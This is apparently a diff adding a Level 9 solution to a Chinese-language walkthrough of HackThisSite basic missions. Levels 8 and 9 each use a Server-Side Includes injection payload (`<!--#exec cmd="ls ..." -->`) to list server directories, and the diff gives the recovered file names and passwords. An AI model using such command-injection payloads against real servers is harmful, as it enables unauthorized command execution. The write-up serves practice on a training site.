@@ -93,3 +93,15 @@ Sam的女儿用PHP写了一些php代码保存文件。
 提示：[Server-Side Includes (SSI) Injection](https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection)
 
 输入：`<!--#exec cmd="ls ../" --> ` ， 访问[au12ha39vc.php](https://www.hackthissite.org/missions/basic/8/au12ha39vc.php) 获得密码：e1361dfd
+
+### Lv9：<https://www.hackthissite.org/missions/basic/9/>
+
+描述中已有提示；和Lv8使用的方法一样，需要借助Lv8获得Lv9的密码。
+
+在Lv8输入：
+
+```
+<!--#exec cmd="ls /var/www/hackthissite.org/html/missions/basic/9/" --> 
+```
+
+访问 [p91e283zc3.php](https://www.hackthissite.org/missions/basic/9/p91e283zc3.php) 获得密码：b0ae2407
